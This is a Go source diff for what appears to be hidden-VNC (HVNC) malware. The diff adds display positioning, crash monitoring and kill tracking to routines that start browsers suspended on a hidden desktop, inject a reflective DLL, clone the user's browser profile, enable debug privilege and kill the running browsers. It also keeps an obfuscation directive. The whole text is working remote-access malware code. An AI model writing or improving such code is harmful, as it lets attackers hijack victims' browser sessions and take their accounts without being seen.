@@ -30,6 +30,7 @@ var (
 	procCreateFileMappingW    = kernel32.NewProc("CreateFileMappingW")
 	procMapViewOfFile         = kernel32.NewProc("MapViewOfFile")
 	procUnmapViewOfFile       = kernel32.NewProc("UnmapViewOfFile")
+	procGetExitCodeProcess    = kernel32.NewProc("GetExitCodeProcess")
 )
 
 var advapi32 = syscall.NewLazyDLL("advapi32.dll")
@@ -65,6 +66,58 @@ const (
 	IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b
 	IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
 )
+
+func describeExitCode(code uint32) string {
+	switch code {
+	case 0:
+		return "normal exit"
+	case 0xC0000005:
+		return "access violation (0xC0000005)"
+	case 0xC0000374:
+		return "heap corruption (0xC0000374)"
+	case 0xC0000409:
+		return "stack buffer overrun (0xC0000409)"
+	case 0xC000001D:
+		return "illegal instruction (0xC000001D)"
+	case 0xC00000FD:
+		return "stack overflow (0xC00000FD)"
+	case 0xC0000096:
+		return "privileged instruction (0xC0000096)"
+	case 0x40010004:
+		return "debugger terminated process"
+	case 0xC000013A:
+		return "process killed by Ctrl+C"
+	case 1:
+		return "general error (exit code 1)"
+	default:
+		return fmt.Sprintf("exit code 0x%X (%d)", code, code)
+	}
+}
+
+func monitorProcessCrash(pid uint32, label string, notify func(step string, success bool, detail string)) {
+	hProc, _, _ := procOpenProcess.Call(
+		SYNCHRONIZE|0x1000, // SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION
+		0, uintptr(pid),
+	)
+	if hProc == 0 {
+		return
+	}
+	defer procCloseHandle.Call(hProc)
+
+	ret, _, _ := procWaitForSingleObject.Call(hProc, 8000)
+	if ret != 0 {
+		return
+	}
+
+	var exitCode uint32
+	procGetExitCodeProcess.Call(hProc, uintptr(unsafe.Pointer(&exitCode)))
+
+	if exitCode == 0 {
+		notify("exited", false, fmt.Sprintf("%s (PID %d) exited immediately — %s", label, pid, describeExitCode(exitCode)))
+	} else {
+		notify("crashed", false, fmt.Sprintf("%s (PID %d) crashed — %s", label, pid, describeExitCode(exitCode)))
+	}
+}
 
 // enableDebugPrivilege attempts to enable SeDebugPrivilege for the current process.
 func enableDebugPrivilege() {
@@ -103,7 +156,7 @@ func enableDebugPrivilege() {
 // StartHVNCProcessInjected starts a process suspended on the HVNC desktop,
 // injects the reflective DLL, then resumes it.
 // searchPath/replacePath are passed as environment variables for the DLL hooks.
-func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) (uint32, error) {
+func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
 	}
@@ -118,6 +171,7 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes 
 		captureDllBytes: captureDllBytes,
 		searchPath:      searchPath,
 		replacePath:     replacePath,
+		display:         display,
 	}, 30*time.Second)
 	if err != nil {
 		return 0, err
@@ -125,7 +179,7 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes 
 	return result.pid, result.err
 }
 
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
 	if onDXGIStatus != nil {
 		hvncDXGIStatusCallback.Store(onDXGIStatus)
 	}
@@ -158,12 +212,12 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 		}
 		if isProcessRunning(processName) {
 			notify("kill", true, fmt.Sprintf("killing running %s", processName))
-			killProcess(processName)
+			killed := killProcess(processName)
 			time.Sleep(1500 * time.Millisecond)
 			if isProcessRunning(processName) {
-				notify("kill", false, fmt.Sprintf("%s still running after kill attempt", processName))
+				notify("kill", false, fmt.Sprintf("%s still running after kill attempt (%d terminated)", processName, len(killed)))
 			} else {
-				notify("kill", true, fmt.Sprintf("%s terminated", processName))
+				notify("kill", true, fmt.Sprintf("terminated %d %s process(es) (PIDs %v)", len(killed), processName, killed))
 			}
 		} else {
 			notify("kill", true, fmt.Sprintf("%s not running, no kill needed", processName))
@@ -172,7 +226,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 	if !clone {
 		notify("launch", true, "starting without profile cloning")
-		pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, "", "")
+		pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, "", "", display)
 		if err != nil {
 			notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 			return err
@@ -182,6 +236,12 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 			go func() {
 				defer recoverAndLog("hvnc patch opera", nil)
 				patchOperaAsync(pid, 5, 2*time.Second)
+			}()
+		}
+		if pid != 0 {
+			go func() {
+				defer recoverAndLog("hvnc crash monitor", nil)
+				monitorProcessCrash(pid, info.name, notify)
 			}()
 		}
 		return nil
@@ -224,7 +284,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 	}
 
 	notify("launch", true, "starting with cloned profile")
-	pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir)
+	pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir, display)
 	if err != nil {
 		notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 		return err
@@ -236,12 +296,18 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 			patchOperaAsync(pid, 5, 2*time.Second)
 		}()
 	}
+	if pid != 0 {
+		go func() {
+			defer recoverAndLog("hvnc crash monitor", nil)
+			monitorProcessCrash(pid, info.name, notify)
+		}()
+	}
 	return nil
 }
 
 // StartHVNCChromeInjected is kept for backward compatibility.
 func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
-	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, nil, nil, nil)
+	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, 0, nil, nil, nil)
 }
 
 type browserInfo struct {
@@ -417,10 +483,10 @@ func isProcessRunning(name string) bool {
 	return false
 }
 
-func killProcess(name string) {
+func killProcess(name string) []uint32 {
 	snapshot, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(0x2, 0)
 	if snapshot == uintptr(^uintptr(0)) {
-		return
+		return nil
 	}
 	defer procCloseHandle.Call(snapshot)
 
@@ -437,11 +503,12 @@ func killProcess(name string) {
 		ExeFile         [260]uint16
 	}
 
+	var killed []uint32
 	var entry processEntry32
 	entry.Size = uint32(unsafe.Sizeof(entry))
 	ret, _, _ := kernel32.NewProc("Process32FirstW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
 	if ret == 0 {
-		return
+		return nil
 	}
 	target := strings.ToLower(name)
 	for {
@@ -449,9 +516,14 @@ func killProcess(name string) {
 		if strings.ToLower(exeName) == target {
 			hProc, _, _ := procOpenProcess.Call(0x0001, 0, uintptr(entry.ProcessID)) // PROCESS_TERMINATE
 			if hProc != 0 {
-				kernel32.NewProc("TerminateProcess").Call(hProc, 0)
+				r, _, _ := kernel32.NewProc("TerminateProcess").Call(hProc, 0)
 				procCloseHandle.Call(hProc)
-				log.Printf("hvnc: terminated %s (PID %d)", name, entry.ProcessID)
+				if r != 0 {
+					killed = append(killed, entry.ProcessID)
+					log.Printf("hvnc: terminated %s (PID %d)", name, entry.ProcessID)
+				} else {
+					log.Printf("hvnc: failed to terminate %s (PID %d)", name, entry.ProcessID)
+				}
 			}
 		}
 		entry.Size = uint32(unsafe.Sizeof(entry))
@@ -460,6 +532,7 @@ func killProcess(name string) {
 			break
 		}
 	}
+	return killed
 }
 
 func getBrowserUserDataDir(info browserInfo) string {
@@ -785,7 +858,7 @@ func calcDirSize(dir string) int64 {
 	return total
 }
 
-func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) (uint32, error) {
+func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
@@ -805,7 +878,7 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 	enableDebugPrivilege()
 
 	// Create the process suspended on the HVNC desktop
-	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName, len(dllBytes))
+	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName, len(dllBytes), display)
 	if err != nil {
 		procCloseHandle.Call(shmHandle)
 		return 0, fmt.Errorf("failed to create suspended process: %v", err)
@@ -1052,12 +1125,17 @@ func createDLLSharedMemory(dllBytes []byte) (handle uintptr, name string, err er
 	return handle, name, nil
 }
 
-func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName string, dllSize int) (hProcess, hThread uintptr, pid uint32, err error) {
+func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName string, dllSize int, display int) (hProcess, hThread uintptr, pid uint32, err error) {
 	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to convert desktop name: %v", err)
 	}
-	args := " --window-position=0,0"
+	posX, posY := 0, 0
+	if mons := monitorList(); display >= 0 && display < len(mons) {
+		posX = mons[display].rect.Min.X
+		posY = mons[display].rect.Min.Y
+	}
+	args := fmt.Sprintf(" --window-position=%d,%d", posX, posY)
 	chromiumExes := map[string]bool{
 		"chrome.exe":  true,
 		"brave.exe":   true,
@@ -1082,8 +1160,8 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName 
 	var pi processInformation
 	si.cb = uint32(unsafe.Sizeof(si))
 	si.lpDesktop = desktopNamePtr
-	si.dwX = 0
-	si.dwY = 0
+	si.dwX = uint32(posX)
+	si.dwY = uint32(posY)
 	si.dwFlags = STARTF_USEPOSITION
 
 	envBlock, err := buildEnvironmentBlock(searchPath, replacePath, shmName, dllSize)
